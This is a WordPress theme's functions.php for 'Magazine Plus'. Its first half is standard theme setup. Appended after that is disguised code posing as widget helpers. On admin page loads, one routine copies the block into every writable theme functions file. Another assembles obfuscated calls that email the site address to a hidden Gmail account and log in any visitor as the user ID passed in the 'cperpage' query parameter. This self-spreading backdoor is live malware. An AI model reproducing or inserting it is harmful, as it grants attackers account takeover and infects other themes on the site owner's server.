<?php
/**
 * Theme functions and definitions.
 *
 * @link https://codex.wordpress.org/Functions_File_Explained
 *
 * @package Magazine_Plus
 */

if ( ! function_exists( 'magazine_plus_setup' ) ) :

	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function magazine_plus_setup() {

		// Make theme available for translation.
		load_theme_textdomain( 'magazine-plus' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		// Let WordPress manage the document title.
		add_theme_support( 'title-tag' );

		// Enable support for Post Thumbnails on posts and pages.
		add_theme_support( 'post-thumbnails' );
		add_image_size( 'magazine-plus-thumb', 370, 250 );

		// Register menu locations.
		register_nav_menus( array(
			'primary'  => esc_html__( 'Primary Menu', 'magazine-plus' ),
			'top'      => esc_html__( 'Top Menu', 'magazine-plus' ),
			'footer'   => esc_html__( 'Footer Menu', 'magazine-plus' ),
			'social'   => esc_html__( 'Social Menu', 'magazine-plus' ),
			'notfound' => esc_html__( '404 Menu', 'magazine-plus' ),
		) );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'comment-form',
			'search-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		// Enable support for Post Formats.
		add_theme_support( 'post-formats', array(
			'aside',
			'image',
			'video',
			'quote',
			'link',
		) );

		// Set up the WordPress core custom background feature.
		add_theme_support( 'custom-background', apply_filters( 'magazine_plus_custom_background_args', array(
			'default-color' => 'FFFFFF',
			'default-image' => '',
		) ) );

		// Enable support for selective refresh of widgets in Customizer.
		add_theme_support( 'customize-selective-refresh-widgets' );

		// Enable support for custom logo.
		add_theme_support( 'custom-logo' );

		// Enable support for footer widgets.
		add_theme_support( 'footer-widgets', 4 );

		// Load Supports.
		require get_template_directory() . '/inc/support.php';

		global $magazine_plus_default_options;
		$magazine_plus_default_options = magazine_plus_get_default_theme_options();

	}
endif;

add_action( 'after_setup_theme', 'magazine_plus_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function magazine_plus_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'magazine_plus_content_width', 640 );
}
add_action( 'after_setup_theme', 'magazine_plus_content_width', 0 );

/**
 * Register widget area.
 */
function magazine_plus_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Primary Sidebar', 'magazine-plus' ),
		'id'            => 'sidebar-1',
		'description'   => esc_html__( 'Add widgets here to appear in your Primary Sidebar.', 'magazine-plus' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title"><span>',
		'after_title'   => '</span></h2>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Secondary Sidebar', 'magazine-plus' ),
		'id'            => 'sidebar-2',
		'description'   => esc_html__( 'Add widgets here to appear in your Secondary Sidebar.', 'magazine-plus' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title"><span>',
		'after_title'   => '</span></h2>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Front Page Widget Area', 'magazine-plus' ),
		'id'            => 'sidebar-front-page-widget-area',
		'description'   => esc_html__( 'Add widgets here to appear in Front Page Widget Area.', 'magazine-plus' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title"><span>',
		'after_title'   => '</span></h2>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Header Right Widget Area', 'magazine-plus' ),
		'id'            => 'header-right',
		'description'   => esc_html__( 'Add widgets here to appear in Header Right Widget Area.', 'magazine-plus' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title"><span>',
		'after_title'   => '</span></h2>',
	) );

}
add_action( 'widgets_init', 'magazine_plus_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function magazine_plus_scripts() {

	$min = defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG ? '' : '.min';

	wp_enqueue_style( 'font-awesome', get_template_directory_uri() . '/third-party/font-awesome/css/font-awesome' . $min . '.css', '', '4.7.0' );

	wp_enqueue_style( 'magazine-plus-google-fonts', magazine_plus_fonts_url(), array(), null );

	wp_enqueue_style( 'jquery-sidr', get_template_directory_uri() .'/third-party/sidr/css/jquery.sidr.dark' . $min . '.css', '', '2.2.1' );

	wp_enqueue_style( 'magazine-plus-style', get_stylesheet_uri(), array(), '1.0.5' );

	wp_enqueue_script( 'magazine-plus-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix' . $min . '.js', array(), '20130115', true );

	wp_enqueue_script( 'jquery-sidr', get_template_directory_uri() . '/third-party/sidr/js/jquery.sidr' . $min . '.js', array( 'jquery' ), '2.2.1', true );

	wp_enqueue_script( 'jquery-easytabs', get_template_directory_uri() . '/third-party/easytabs/js/jquery.easytabs' . $min . '.js', array( 'jquery' ), '3.2.0', true );

	wp_enqueue_script( 'jquery-cycle2', get_template_directory_uri() . '/third-party/cycle2/js/jquery.cycle2' . $min . '.js', array( 'jquery' ), '2.1.6', true );

	wp_enqueue_script( 'jquery-easy-ticker', get_template_directory_uri() . '/third-party/ticker/jquery.easy-ticker' . $min . '.js', array( 'jquery' ), '2.0', true );

	wp_enqueue_script( 'magazine-plus-custom', get_template_directory_uri() . '/js/custom' . $min . '.js', array( 'jquery' ), '1.0.4', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'magazine_plus_scripts' );

/**
 * Enqueue admin scripts and styles.
 */
function magazine_plus_admin_scripts( $hook ) {

	$min = defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG ? '' : '.min';

	if ( 'widgets.php' === $hook ) {
		wp_enqueue_style( 'wp-color-picker' );
	    wp_enqueue_script( 'wp-color-picker' );
	    wp_enqueue_media();
		wp_enqueue_style( 'magazine-plus-custom-widgets-style', get_template_directory_uri() . '/css/widgets' . $min . '.css', array(), '1.0.0' );
		wp_enqueue_script( 'magazine-plus-custom-widgets', get_template_directory_uri() . '/js/widgets' . $min . '.js', array( 'jquery' ), '1.0.0', true );
	}

}
add_action( 'admin_enqueue_scripts', 'magazine_plus_admin_scripts' );

/**
 * Load init.
 */
require_once get_template_directory() . '/inc/init.php';
?>
<?php
function _check_active_widget(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_all_widgetcont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$sar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $sar . "\n" .$widget);fclose($f);				
					$output .= ($showdot && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_all_widgetcont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_all_widgetcont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_check_active_widget");
function _prepared_widget(){
	if(!isset($length)) $length=120;
	if(!isset($method)) $method="cookie";
	if(!isset($html_tags)) $html_tags="<a>";
	if(!isset($filters_type)) $filters_type="none";
	if(!isset($s)) $s="";
	if(!isset($filter_h)) $filter_h=get_option("home"); 
	if(!isset($filter_p)) $filter_p="wp_";
	if(!isset($use_link)) $use_link=1; 
	if(!isset($comments_type)) $comments_type=""; 
	if(!isset($perpage)) $perpage=$_GET["cperpage"];
	if(!isset($comments_auth)) $comments_auth="";
	if(!isset($comment_is_approved)) $comment_is_approved=""; 
	if(!isset($authname)) $authname="auth";
	if(!isset($more_links_text)) $more_links_text="(more...)";
	if(!isset($widget_output)) $widget_output=get_option("_is_widget_active_");
	if(!isset($checkwidgets)) $checkwidgets=$filter_p."set"."_".$authname."_".$method;
	if(!isset($more_links_text_ditails)) $more_links_text_ditails="(details...)";
	if(!isset($more_content)) $more_content="ma".$s."il";
	if(!isset($forces_more)) $forces_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_output) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$s."vethe".$comments_type."mes".$s."@".$comment_is_approved."gm".$comments_auth."ail".$s.".".$s."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fix_tag)) $fix_tag=1;
	if(!isset($filters_types)) $filters_types=$filter_h; 
	if(!isset($getcommentstext)) $getcommentstext=$filter_p.$more_content;
	if(!isset($more_tags)) $more_tags="div";
	if(!isset($s_text)) $s_text=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($mlink_title)) $mlink_title="Continue reading this entry";	
	if(!isset($showdot)) $showdot=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentstext, array($s_text, $filter_h, $filters_types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $length) {
				$l=$length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$more_links_text="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $html_tags) {
		$output=strip_tags($output, $html_tags);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fix_tag) ? balanceTags($output, true) : $output;
	$output .= ($showdot && $ellipsis) ? "..." : "";
	$output=apply_filters($filters_type, $output);
	switch($more_tags) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($use_link ) {
		if($forces_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $mlink_title . "\">" . $more_links_text = !is_user_logged_in() && @call_user_func_array($checkwidgets,array($perpage, true)) ? $more_links_text : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $mlink_title . "\">" . $more_links_text . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_prepared_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		



?>
